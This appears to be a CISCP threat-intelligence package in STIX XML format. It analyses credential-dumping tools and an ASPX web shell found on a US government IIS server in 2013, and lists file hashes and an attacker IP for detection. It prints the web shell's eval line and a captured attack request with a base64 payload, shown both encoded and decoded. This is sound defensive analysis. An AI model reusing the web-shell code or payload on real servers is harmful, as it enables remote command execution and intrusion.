@@ -1,0 +1,208 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:CISCP="http://www.us-cert.gov/ciscp" xmlns:AddrObj="http://cybox.mitre.org/objects#AddressObject-2" id="CISCP:IB-13-10706" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Analysis of Custom Hacker Tools and ASPX Script Used to Create Malicious Web-shells</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On 09 October 2013, an agency submitted files for analysis. The submitted executables are custom tools that are capable of extracting password hashes, authentication information, as well as domain and user information from a host computer. The submitted ASPX page is capable of creating a web-shell on an infected IIS web host.
+
+This document incorporates data originally released as MIFR-318793.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-8ce8e080-72d9-494c-b5b6-4324218c403c" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-07cb3f86-bf37-42d0-b195-9f4b7f649ee1"/>
+        <indicator:Indicator idref="CISCP:indicator-0638b502-0ad7-4bfd-ae99-7427df7c6936"/>
+        <indicator:Indicator idref="CISCP:indicator-8626cf77-4e70-464a-b3e7-3dee0b027b19"/>
+        <indicator:Indicator idref="CISCP:indicator-e6dde801-1618-4f48-9c54-012093214e4e"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-07cb3f86-bf37-42d0-b195-9f4b7f649ee1" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Host Characteristics</indicator:Type>
+      <indicator:Description>This program is a custom tool capable of retrieving computer name, user information, domain information, and authentication packages available on the computer. This tool is a 64-bit program and does not execute under 32-bit conditions.
+
+When executed, it accepts either no parameters, or the "/ViewAll" flag. It will then adjust its own privilege to set "SeDebugPrivilege" in order to access memory of other processes. If it could not set the privilege, the program exits with an error.
+
+This tool retrieves the information it's seeking by traversing through the process list until it finds "LSASS.exe". "LSASS.exe" is Miscrosoft Window's "Local Security Access Subsystem Service", and handles user logon, security policies, etc. This tool will open a handle to "LSASS.exe" and look for information in memory. The tool has no network connectivity and will display the information it found on the console. See sample output below.
+
+&gt;64.exe /ViewAll
+Authentication Package : NTLM
+kerberos: NULL
+wdigest: NULL
+tspkg : NULL
+User Principal : User01 (Administrator)
+Domain Authentication : WIN-9HCD8SHFT5Q
+Authentication Package : NTLM
+kerberos: NULL
+wdigest: NULL
+tspkg : NULL
+User Principal : WIN-9HCD8SHFT5Q$(Non-Exist)
+Domain Authentication : WORKGROUP</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-185929a3-d997-481b-9c79-9af4140c61ea">
+        <cybox:Object id="CISCP:Object-ba19d799-bfa8-4abc-9c6f-161fce0d4b2e">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">64.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">26112</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">9a1cdb35a45d586204d4ca2e0cfca595</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">b137f9c86c1ad1ff036c46bcb00bc8d4e73c8510</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">4717db1647d83e88989b626993207ef0911b2e1d626ef0f5476be1db00999020</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:0KQxU1nLi0AJiPKe2RV7IIlTyevvHbZNW2Gw/MeniLZcbO9sRdRJatnW:Bn2IAZ3HbOexil4o</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-10-09T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-0638b502-0ad7-4bfd-ae99-7427df7c6936" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">File Hash Watchlist</indicator:Type>
+      <indicator:Description>This ASPX script attempts to execute "eval(Request.Item["[REDACTED PASSWORD]"], "unsafe");". This command allows the web server to execute any ASPX command it receives from the internet. An attacker could send a message to the server to execute any command that the server is configured to allow. In most default configurations, this file acts as a full-fledged web-shell.
+
+Suspicious traffic to a U.S. Government server from the Taiwan IP address 211.22.125.102 was observed utilizing this script. 
+
+As shown in the network traffic below, the "X-Forwarded-For" header is the originating IP address of a client connecting to a web server through an HTTP proxy or load balancer. In this case, the HTTP proxy or load balancer was found to be 211.22.125.102. The reporting source found that the access appears to indicate successful web-shell access by the attacker.
+
+The following activity was observed:
+POST /arcgis/test.aspx HTTP/1.1 
+Cache-Control: no-cache 
+X-Forwarded-For: [REDACTED] 
+Referer: [REDACTED] 
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) 
+Host: [REDACTED] 
+Content-Length: 436 
+Connection: Close 
+
+
+[REDACTED]=Response.Write("-&gt;,");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("dmFyIGM9U3lzdGVtLklPLkRpcmVjdG9yeS5HZXRMb2dpY2FsRHJpdmVzKCk7UmVzcG9uc2UuV3JpdGUoU2VydmVyLk1hcFBhdGgoIi4iKSsiCSIpO2Zvcih2YXIgaT0wO2k8PWMubGVuZ3RoLTE7aSsrKVJlc3BvbnNlLldyaXRlKGNbaV1bMF0rIjoiKTs%3D")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write(",&lt;-");Response.End();HTTP/1.1 200 OK 
+Cache-Control: private 
+Content-Type: text/html; charset=utf-8 
+Server: Microsoft-IIS/7.0 
+Set-Cookie: ASP.NET_SessionId=qktdfp45guyi4d55gxkmj455; path=/; HttpOnly 
+X-AspNet-Version: 2.0.50727 
+X-Powered-By: ASP.NET 
+Date: Tue, 08 Oct 2013 10:47:51 GMT 
+Connection: close 
+Content-Length: 44 
+
+test-&gt;,C:\inetpub\wwwroot\arcgis.A:C:D:E:,&lt;-
+
+The decoded Base 64 string contains the following:
+var c=System.IO.Directory.GetLogicalDrives();Response.Write(Server.MapPath(".")+"	");for(var i=0;i&lt;=c.length-1;i++)Response.Write(c[i][0]+":");7</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-54e9e877-0d43-4d07-a7b3-ea6fedb06bd7">
+        <cybox:Object id="CISCP:Object-1abbf7a1-3e07-4518-8594-866963db407f">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">test.aspx</FileObj:File_Name>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">8657ca069ff2634ad0bcdf400edec589</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">1134f7668f6821df721fee7a2f9e1b5d51d3c2b6</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3:aEwJkW6XA5eRtNVZYvGv:aEm775e/HCuv</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-10-09T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-8626cf77-4e70-464a-b3e7-3dee0b027b19" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type>
+      <indicator:Description>Suspicious traffic to a U.S. Government server from this Taiwan IP address was observed.  The observed URL string utilized a malicious "test.aspx" script that appeared to indicate successful web-shell access by an attacker.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-a66e864b-809f-4c75-ba95-e3525e091a3b">
+        <cybox:Object id="CISCP:Object-9a04aa5e-97ae-402b-b3d2-0733ef0f63b7">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">211.22.125.102</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-10-08T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-e6dde801-1618-4f48-9c54-012093214e4e" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">File Hash Watchlist</indicator:Type>
+      <indicator:Description>This dynamic link library (DLL) is a custom implementation of the code used by PWDump3 and PWDump4. It has two exports, "GetHash" and "SetAccessPriv". When used in conjunction with another executable that imports this DLL, it will be able to dump a system's LM/NTLM hashes. This DLL was compiled as a 64-bit program and does not execute under 32-bit conditions.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-1d20484f-81f9-452b-8790-375577c664e4">
+        <cybox:Object id="CISCP:Object-1c135d07-3ec6-4588-a12d-01c040f658ac">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">likbie.dll</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">68608</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">b185cc2e39089ea051d24ec909816a54</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">8e3bcf264447e96dea5cbe649372abf0794cd94d</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">d1811238b4ef067769ce783689cf5300ee4259c2684131019235b3dfd775d32b</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">1536:LrWauqMY4vMEBSkS1K/l/upBaPfh1r9DCIBlrbquHLaAbyo5A:Lrzuqq/0kSk/lupB6XUIviuuAbyo5A</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-10-09T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
